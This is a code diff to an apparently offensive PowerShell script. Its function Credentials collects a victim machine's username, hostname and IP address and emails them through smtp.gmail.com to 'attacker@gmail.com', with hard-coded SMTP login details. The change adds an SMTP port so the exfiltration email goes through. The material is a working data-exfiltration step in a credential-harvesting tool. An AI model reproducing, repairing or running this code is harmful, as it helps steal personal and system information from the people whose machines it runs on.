@@ -199,6 +199,7 @@ function Credentials() {
     
 
 $SmtpServer = 'smtp.gmail.com'
+$SmtpPort = 587
 $SmtpUser = 'attacker@gmail.com'
 $smtpPassword = 'password123'
 $MailtTo = 'attacker@gmail.com'
@@ -222,6 +223,6 @@ $ip_output = "IP : "
 $newline = "`r`n"
 
 $sysinfo = $username_output+$username_command+$newline+$hostname_output+$hostname_command+$newline+$ip_output+$ipaddr_command+$newline
-Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body $sysinfo -SmtpServer $SmtpServer -UseSsl -Credential $credentials
+Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body $sysinfo -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl -Credential $credentials
 
 Credentials
